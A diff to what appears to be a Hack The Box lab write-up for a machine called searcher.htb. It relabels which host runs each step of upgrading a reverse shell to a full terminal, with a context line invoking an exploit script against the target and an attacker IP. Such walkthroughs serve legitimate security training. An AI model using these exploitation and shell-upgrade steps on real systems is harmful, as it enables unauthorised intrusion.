@@ -123,11 +123,18 @@ $ ./exploit.sh searcher.htb 10.10.15.150
 
 Shell lands immediately. I upgrade to a proper PTY.
 
-**Kali:**
+**Target (svc):**
 ```console
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Ctrl+Z
+```
+
+**Kali:**
+```console
 $ stty raw -echo; fg
+```
+
+**Target (svc):**
+```console
 $ export TERM=xterm
 ```
 
